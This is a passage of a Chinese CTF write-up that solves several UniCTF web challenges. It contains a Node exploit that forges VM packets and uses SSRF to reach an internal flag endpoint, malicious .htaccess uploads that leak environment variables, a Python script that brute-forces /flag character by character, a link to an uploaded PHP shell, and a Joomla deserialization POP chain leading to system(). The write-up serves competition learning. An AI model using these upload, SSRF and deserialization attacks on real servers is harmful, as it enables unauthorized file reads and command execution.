function_">encodeOp</span>(opId, nonceLow32);</span><br><span class="line">      chunks.<span class="title function_">push</span>(...<span class="title function_">u32le</span>(opCode));</span><br><span class="line">      chunks.<span class="title function_">push</span>(flags &amp; <span class="number">0xff</span>);</span><br><span class="line">      chunks.<span class="title function_">push</span>(...<span class="title function_">u16le</span>(argBytes.<span class="property">length</span>));</span><br><span class="line">      chunks.<span class="title function_">push</span>(...argBytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> body = <span class="title class_">Uint8Array</span>.<span class="title function_">from</span>(chunks);</span><br><span class="line">    <span class="keyword">const</span> checksum = <span class="title function_">fnv1a32</span>(body);</span><br><span class="line">    <span class="keyword">const</span> pkt = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(body.<span class="property">length</span> + <span class="number">4</span>);</span><br><span class="line">    pkt.<span class="title function_">set</span>(body,<span class="number">0</span>); pkt.<span class="title function_">set</span>(<span class="title function_">u32le</span>(checksum), body.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Buffer</span>.<span class="title function_">from</span>(pkt).<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">buildPacket</span>([[<span class="number">0</span>, <span class="string">&#x27;test&#x27;</span>]], <span class="number">0x83</span>));</span><br></pre></td></tr></table></figure>
+
+<p>示例 curl（你也可以把 base64 放进 Burp Repeater 发）：</p>
+<p><strong>1) &#x2F;api&#x2F;vm</strong></p>
+<p>curl -s -X POST <br>    -H ‘Content-Type: application&#x2F;json’ <br>    -d ‘{“packet_b64”:”&lt;上面脚本输出&gt;”}’ <br>    <a target="_blank" rel="noopener" href="http://80-a62269aa-3142-40ac-9145-ed2f2c20e404.challenge.ctfplus.cn/api/vm">http://80-a62269aa-3142-40ac-9145-ed2f2c20e404.challenge.ctfplus.cn/api/vm</a></p>
+<p><strong>2) &#x2F;api&#x2F;fetch 取 flag</strong></p>
+<p>curl -s <br>    ‘<a target="_blank" rel="noopener" href="http://80-a62269aa-3142-40ac-9145-ed2f2c20e404.challenge.ctfplus.cn/api/fetch?url=http://127.0.0.1/internal/flag&token=you-">http://80-a62269aa-3142-40ac-9145-ed2f2c20e404.challenge.ctfplus.cn/api/fetch?url=http://127.0.0.1/internal/flag&amp;token=you-</a>got-me-baby-where-is-my-bytecode’</p>
+<p>结果</p>
+<ul>
+<li>token：you-got-me-baby-where-is-my-bytecode</li>
+<li>flag：UniCTF{68e4ef12-b019-49c6-9a0b-ba17c6fcb7a4}</li>
+</ul>
+<p>一键脚本：node 1.js url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">   // exploit.js</span><br><span class="line">   const http = require(&#x27;http&#x27;);</span><br><span class="line">   const https = require(&#x27;https&#x27;);</span><br><span class="line">   const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line"> </span><br><span class="line">   const TARGET = process.argv[2] || &#x27;http://80-a62269aa-3142-40ac-9145-ed2f2c20e404.challenge.ctfplus.cn/&#x27;;</span><br><span class="line"> </span><br><span class="line">   const K = [0x1c, 0x2d, 0x3e, 0x40, 0xa5, 0xb6, 0xc7, 0xd8, 0x24, 0x68, 0xac, 0xe0];</span><br><span class="line">   const K1 = ((K[0] &lt;&lt; 24) | (K[1] &lt;&lt; 16) | (K[2] &lt;&lt; 8) | K[3]) &gt;&gt;&gt; 0;</span><br><span class="line">   const K2 = ((K[4] &lt;&lt; 24) | (K[5] &lt;&lt; 16) | (K[6] &lt;&lt; 8) | K[7]) &gt;&gt;&gt; 0;</span><br><span class="line">   const K3 = ((K[8] &lt;&lt; 24) | (K[9] &lt;&lt; 16) | (K[10] &lt;&lt; 8) | K[11]) &gt;&gt;&gt; 0;</span><br><span class="line">   const ROT = 11;</span><br><span class="line"> </span><br><span class="line">   function rotl32(value, shift) &#123;</span><br><span class="line">     return ((value &lt;&lt; shift) | (value &gt;&gt;&gt; (32 - shift))) &gt;&gt;&gt; 0;</span><br><span class="line">   &#125;</span><br><span class="line">   function encodeOp(opId, nonceLow32) &#123;</span><br><span class="line">     const rot = (rotl32((nonceLow32 ^ K2) &gt;&gt;&gt; 0, ROT) &amp; 0xfffffffc) &gt;&gt;&gt; 0;</span><br><span class="line">     const base = ((opId ^ K1) + rot) &gt;&gt;&gt; 0;</span><br><span class="line">     return ((base ^ K3) | 0x80000000) &gt;&gt;&gt; 0;</span><br><span class="line">   &#125;</span><br><span class="line">   function fnv1a32(bytes) &#123;</span><br><span class="line">     let hash = 0x811c9dc5;</span><br><span class="line">     for (let i = 0; i &lt; bytes.length; i += 1) &#123;</span><br><span class="line">       hash ^= bytes[i];</span><br><span class="line">       hash = (hash * 0x01000193) &gt;&gt;&gt; 0;</span><br><span class="line">     &#125;</span><br><span class="line">     return hash &gt;&gt;&gt; 0;</span><br><span class="line">   &#125;</span><br><span class="line">   function u32le(v) &#123; return [v &amp; 0xff, (v &gt;&gt;&gt; 8) &amp; 0xff, (v &gt;&gt;&gt; 16) &amp; 0xff, (v &gt;&gt;&gt; 24) &amp; 0xff]; &#125;</span><br><span class="line">   function u16le(v) &#123; return [v &amp; 0xff, (v &gt;&gt;&gt; 8) &amp; 0xff]; &#125;</span><br><span class="line"> </span><br><span class="line">   function buildPacket(ops, flags = 0x83) &#123;</span><br><span class="line">     const encoder = new TextEncoder();</span><br><span class="line">     const nonce = crypto.randomBytes(8);</span><br><span class="line">     const nonceLow32 = new DataView(nonce.buffer, nonce.byteOffset, nonce.byteLength).getUint32(0, true);</span><br><span class="line"> </span><br><span class="line">     const chunks = [];</span><br><span class="line">     chunks.push(...encoder.encode(&#x27;WVLT&#x27;));</span><br><span class="line">     chunks.push(0x01);</span><br><span class="line">     chunks.push(...nonce);</span><br><span class="line">     chunks.push(ops.length &amp; 0xff);</span><br><span class="line"> </span><br><span class="line">     for (const [opId, arg] of ops) &#123;</span><br><span class="line">       const argBytes = encoder.encode(arg);</span><br><span class="line">       const opCode = encodeOp(opId, nonceLow32);</span><br><span class="line">       chunks.push(...u32le(opCode));</span><br><span class="line">       chunks.push(flags &amp; 0xff);</span><br><span class="line">       chunks.push(...u16le(argBytes.length));</span><br><span class="line">       chunks.push(...argBytes);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     const body = Uint8Array.from(chunks);</span><br><span class="line">     const checksum = fnv1a32(body);</span><br><span class="line">     const packet = new Uint8Array(body.length + 4);</span><br><span class="line">     packet.set(body, 0);</span><br><span class="line">     packet.set(u32le(checksum), body.length);</span><br><span class="line">     return Buffer.from(packet).toString(&#x27;base64&#x27;);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   function request(method, path, body) &#123;</span><br><span class="line">     const url = new URL(path, TARGET);</span><br><span class="line">     const client = url.protocol === &#x27;https:&#x27; ? https : http;</span><br><span class="line">     const data = body ? Buffer.from(body) : null;</span><br><span class="line"> </span><br><span class="line">     const opts = &#123;</span><br><span class="line">       method,</span><br><span class="line">       hostname: url.hostname,</span><br><span class="line">       port: url.port || (url.protocol === &#x27;https:&#x27; ? 443 : 80),</span><br><span class="line">       path: url.pathname + url.search,</span><br><span class="line">       headers: data ? &#123;</span><br><span class="line">         &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,</span><br><span class="line">         &#x27;Content-Length&#x27;: data.length</span><br><span class="line">       &#125; : &#123;&#125;</span><br><span class="line">     &#125;;</span><br><span class="line"> </span><br><span class="line">     return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">       const req = client.request(opts, (res) =&gt; &#123;</span><br><span class="line">         let buf = &#x27;&#x27;;</span><br><span class="line">         res.on(&#x27;data&#x27;, (c) =&gt; buf += c);</span><br><span class="line">         res.on(&#x27;end&#x27;, () =&gt; resolve(&#123; status: res.statusCode, body: buf &#125;));</span><br><span class="line">       &#125;);</span><br><span class="line">       req.on(&#x27;error&#x27;, reject);</span><br><span class="line">       if (data) req.write(data);</span><br><span class="line">       req.end();</span><br><span class="line">     &#125;);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   (async () =&gt; &#123;</span><br><span class="line">     // 1) 打进隐藏分发表（flags=0x83）</span><br><span class="line">     const packet_b64 = buildPacket([[0, &#x27;probe&#x27;]], 0x83);</span><br><span class="line">     const vmRes = await request(&#x27;POST&#x27;, &#x27;/api/vm&#x27;, JSON.stringify(&#123; packet_b64 &#125;));</span><br><span class="line">     const vmJson = JSON.parse(vmRes.body || &#x27;&#123;&#125;&#x27;);</span><br><span class="line">     if (!vmJson.ok) throw new Error(&#x27;vm error: &#x27; + (vmJson.error || vmRes.body));</span><br><span class="line"> </span><br><span class="line">     const output = vmJson.output_utf8 || &#x27;&#x27;;</span><br><span class="line">     const token = output.startsWith(&#x27;token:&#x27;) ? output.slice(&#x27;token:&#x27;.length) : output;</span><br><span class="line">     if (!token) throw new Error(&#x27;token not found: &#x27; + output);</span><br><span class="line"> </span><br><span class="line">     // 2) 用 token 访问 internal flag</span><br><span class="line">     const fetchPath = `/api/fetch?url=$&#123;encodeURIComponent(&#x27;http://127.0.0.1/internal/flag&#x27;)&#125;&amp;token=$&#123;encodeURIComponent(token)&#125;</span><br><span class="line">   `;</span><br><span class="line">     const fetchRes = await request(&#x27;GET&#x27;, fetchPath);</span><br><span class="line">     const fetchJson = JSON.parse(fetchRes.body || &#x27;&#123;&#125;&#x27;);</span><br><span class="line"> </span><br><span class="line">     console.log(&#x27;token:&#x27;, token);</span><br><span class="line">     console.log(&#x27;flag:&#x27;, fetchJson.body || fetchRes.body);</span><br><span class="line">   &#125;)().catch((e) =&gt; &#123;</span><br><span class="line">     console.error(&#x27;failed:&#x27;, e.message);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="一鸣唱吧"><a href="#一鸣唱吧" class="headerlink" title="一鸣唱吧"></a>一鸣唱吧</h3><p>疑似非预期，ai扫出来的，<a target="_blank" rel="noopener" href="http://80-a54ecc99-5e27-4291-aa21-471cb328ae88.challenge.ctfplus.cn/uploads/UNiCTF202638.php">http://80-a54ecc99-5e27-4291-aa21-471cb328ae88.challenge.ctfplus.cn/uploads/UNiCTF202638.php</a></p>
+<h3 id="ezUpload"><a href="#ezUpload" class="headerlink" title="ezUpload"></a><strong>ezUpload</strong></h3><ol>
+<li>上传 .htaccess</li>
+</ol>
+<ul>
+<li>在 Proxy 抓包上传任意文件时，改 filename&#x3D;.htaccess，内容如下（不要加引号&#x2F;反斜杠）：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> Header set X-Flag expr=%&#123;osenv:FLAG&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注意：禁止字符 ? $ &amp; ; | \ &lt;&#96;，上面的内容不包含这些字符，可通过。</li>
+</ul>
+<ol>
+<li>触发并读取响应头</li>
+</ol>
+<ul>
+<li>再上传一个普通文件（比如 a.txt），系统返回路径 &#x2F;upload&#x2F;a.txt</li>
+<li>用 Repeater 访问 &#x2F;upload&#x2F;a.txt，在 Response → Headers 中看到：<br>X-Flag: UniCTF{sh1z1_4999857e-f8b0-40d9-9c59-05cd9c36795e}</li>
+</ul>
+<h3 id="ezUpload-Revenge"><a href="#ezUpload-Revenge" class="headerlink" title="ezUpload Revenge!!"></a><strong>ezUpload Revenge!!</strong></h3><ol>
+<li>上传两个基准文件<ul>
+<li>niubi.txt 内容 niubi</li>
+<li>true.txt 内容 Success</li>
+</ul>
+</li>
+<li>上传 .htaccess 设置重写规则<ul>
+<li>当 file(‘&#x2F;flag’) 以某个前缀匹配时，重写到 true.txt</li>
+<li>否则返回 test.txt</li>
+</ul>
+</li>
+<li>通过请求 &#x2F;upload&#x2F;test.txt 观察返回内容<ul>
+<li>Success → 前缀正确</li>
+<li>hello → 前缀错误</li>
+</ul>
+</li>
+<li>用前缀爆破逐字符枚举 flag。</li>
+</ol>
+<p>RewriteEngine On<br>RewriteCond expr “file(‘&#x2F;flag’) &#x3D;~ m#^UniCTF[{]#”<br>RewriteRule ^test[.]txt true.txt [L]</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!<span class="regexp">/usr/</span>bin/env python3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> urllib.<span class="property">request</span></span><br><span class="line"><span class="keyword">from</span> urllib.<span class="property">error</span> <span class="keyword">import</span> <span class="title class_">HTTPError</span>, <span class="title class_">URLError</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">BASE_URL</span> = <span class="string">&quot;http://80-57f3480e-01e2-4751-b923-0597cc0505ed.challenge.ctfplus.cn/&quot;</span></span><br><span class="line"><span class="variable constant_">FLAG_PATH</span> = <span class="string">&quot;/flag&quot;</span></span><br><span class="line"><span class="variable constant_">PROGRESS</span> = <span class="string">&quot;flag_progress.txt&quot;</span></span><br><span class="line"><span class="variable constant_">START_PREFIX</span> = <span class="string">&quot;UniCTF&#123;&quot;</span></span><br><span class="line"><span class="variable constant_">CHARSET</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ-&quot;</span></span><br><span class="line"><span class="variable constant_">SLEEP</span> = <span class="number">0.05</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">upload_file</span>(filename, content):</span><br><span class="line">    boundary = <span class="string">&quot;----WebKitFormBoundary&quot;</span> + uuid.<span class="title function_">uuid4</span>().<span class="property">hex</span></span><br><span class="line">    body = []</span><br><span class="line">    body.<span class="title function_">append</span>(f<span class="string">&quot;--&#123;boundary&#125;&quot;</span>)</span><br><span class="line">    body.<span class="title function_">append</span>(f<span class="string">&#x27;Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;&#123;filename&#125;&quot;&#x27;</span>)</span><br><span class="line">    body.<span class="title function_">append</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>)</span><br><span class="line">    body.<span class="title function_">append</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    body.<span class="title function_">append</span>(content)</span><br><span class="line">    body.<span class="title function_">append</span>(f<span class="string">&quot;--&#123;boundary&#125;--&quot;</span>)</span><br><span class="line">    data = <span class="string">&quot;\r\n&quot;</span>.<span class="title function_">join</span>(body).<span class="title function_">encode</span>()</span><br><span class="line">    req = urllib.<span class="property">request</span>.<span class="title class_">Request</span>(<span class="variable constant_">BASE_URL</span>, data=data)</span><br><span class="line">    req.<span class="title function_">add_header</span>(<span class="string">&quot;Content-Type&quot;</span>, f<span class="string">&quot;multipart/form-data; boundary=&#123;boundary&#125;&quot;</span>)</span><br><span class="line">    req.<span class="title function_">add_header</span>(<span class="string">&quot;Content-Length&quot;</span>, <span class="title function_">str</span>(<span class="title function_">len</span>(data)))</span><br><span class="line">    <span class="keyword">with</span> urllib.<span class="property">request</span>.<span class="title function_">urlopen</span>(req, timeout=<span class="number">10</span>) <span class="keyword">as</span> <span class="attr">r</span>:</span><br><span class="line">        r.<span class="title function_">read</span>()</span><br><span class="line"></span><br><span class="line">def <span class="title function_">fetch_text</span>(url):</span><br><span class="line">    <span class="keyword">with</span> urllib.<span class="property">request</span>.<span class="title function_">urlopen</span>(url, timeout=<span class="number">10</span>) <span class="keyword">as</span> <span class="attr">r</span>:</span><br><span class="line">        <span class="keyword">return</span> r.<span class="title function_">read</span>().<span class="title function_">decode</span>(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">regex_escape</span>(s):</span><br><span class="line">    meta = <span class="title function_">set</span>(<span class="string">&quot;[]()&#123;&#125;.^$|?*+&quot;</span>)</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="attr">s</span>:</span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">            out.<span class="title function_">append</span>(<span class="string">&quot;[-]&quot;</span>)</span><br><span class="line">        elif c == <span class="string">&quot;]&quot;</span>:</span><br><span class="line">            out.<span class="title function_">append</span>(<span class="string">&quot;[]]&quot;</span>)</span><br><span class="line">        elif c <span class="keyword">in</span> <span class="attr">meta</span>:</span><br><span class="line">            out.<span class="title function_">append</span>(f<span class="string">&quot;[&#123;c&#125;]&quot;</span>)</span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            out.<span class="title function_">append</span>(c)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.<span class="title function_">join</span>(out)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">make_htaccess</span>(prefix):</span><br><span class="line">    regex = <span class="string">&quot;^&quot;</span> + <span class="title function_">regex_escape</span>(prefix)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="string">&quot;RewriteEngine On\n&quot;</span></span><br><span class="line">        f<span class="string">&quot;RewriteCond expr \&quot;file(&#x27;&#123;FLAG_PATH&#125;&#x27;) =~ m#&#123;regex&#125;#\&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;RewriteRule ^test[.]txt true.txt [L]\n&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">def <span class="title function_">is_true</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span> <span class="keyword">in</span> <span class="title function_">fetch_text</span>(<span class="variable constant_">BASE_URL</span> + <span class="string">&quot;upload/niubi.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">test_prefix</span>(prefix):</span><br><span class="line">    ht = <span class="title function_">make_htaccess</span>(prefix)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="attr">try</span>:</span><br><span class="line">            <span class="title function_">upload_file</span>(<span class="string">&quot;.htaccess&quot;</span>, ht)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="title function_">except</span> (<span class="title class_">HTTPError</span>, <span class="title class_">URLError</span>, socket.<span class="property">timeout</span>):</span><br><span class="line">            time.<span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">is_true</span>()</span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    # 准备侧信道文件</span><br><span class="line">    <span class="title function_">upload_file</span>(<span class="string">&quot;niubi.txt&quot;</span>, <span class="string">&quot;niubi&quot;</span>)</span><br><span class="line">    <span class="title function_">upload_file</span>(<span class="string">&quot;true.txt&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    prefix = <span class="variable constant_">START_PREFIX</span></span><br><span class="line">    <span class="keyword">if</span> os.<span class="property">path</span>.<span class="title function_">exists</span>(<span class="variable constant_">PROGRESS</span>):</span><br><span class="line">        saved = <span class="title function_">open</span>(<span class="variable constant_">PROGRESS</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).<span class="title function_">read</span>().<span class="title function_">strip</span>()</span><br><span class="line">        <span class="keyword">if</span> <span class="attr">saved</span>:</span><br><span class="line">            prefix = saved</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> not <span class="title function_">test_prefix</span>(prefix):</span><br><span class="line">        <span class="title function_">print</span>(<span class="string">&quot;prefix not valid; check START_PREFIX / FLAG_PATH&quot;</span>, file=sys.<span class="property">stderr</span>)</span><br><span class="line">        sys.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="title class_">True</span>:</span><br><span class="line">        found = <span class="title class_">False</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="attr">CHARSET</span>:</span><br><span class="line">            <span class="attr">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="title function_">test_prefix</span>(prefix + ch):</span><br><span class="line">                    prefix += ch</span><br><span class="line">                    <span class="keyword">with</span> <span class="title function_">open</span>(<span class="variable constant_">PROGRESS</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">                        f.<span class="title function_">write</span>(prefix)</span><br><span class="line">                    <span class="title function_">print</span>(prefix)</span><br><span class="line">                    found = <span class="title class_">True</span></span><br><span class="line">                    <span class="keyword">if</span> ch == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                        <span class="title function_">print</span>(<span class="string">&quot;DONE&quot;</span>, prefix)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="title function_">except</span> (<span class="title class_">HTTPError</span>, <span class="title class_">URLError</span>, socket.<span class="property">timeout</span>):</span><br><span class="line">                time.<span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            time.<span class="title function_">sleep</span>(<span class="variable constant_">SLEEP</span>)</span><br><span class="line">        <span class="keyword">if</span> not <span class="attr">found</span>:</span><br><span class="line">            <span class="title function_">print</span>(<span class="string">&quot;No next char found. Current:&quot;</span>, prefix, file=sys.<span class="property">stderr</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Joomla-Revenge"><a href="#Joomla-Revenge" class="headerlink" title="Joomla Revenge!"></a><strong>Joomla Revenge!</strong></h3><p><strong>核心漏洞与链子</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://file+.vscode-resource.vscode-cdn.net/c%3A/Users/25399/.vscode/extensions/openai.chatgpt-0.4.68-win32-x64/webview/#">unser.php</a> 对 $_POST[‘unser’] 做 base64_decode 后两次 unserialize，且黑名单只拦 WebAssetManager|HtmlDocument，可对象注入。</li>
+<li>可用 POP 链（简单、稳定）：<ol>
+<li>Joomla\Database\Mysqli\MysqliDriver::__destruct()</li>
+<li>DatabaseDriver::disconnect() → dispatchEvent()</li>
+<li>Joomla\Event\Dispatcher::dispatch()</li>
+<li>Joomla\Event\LazyServiceEventListener::__invoke()</li>
+<li>Joomla\DI\Container::get() → Joomla\DI\ContainerResource::getInstance()</li>
+<li>ContainerResource::$factory &#x3D; ‘system’，并传入可 __toString 的对象作为参数</li>
+<li>这里用 Symfony\Component\String\LazyString 保存命令字符串</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 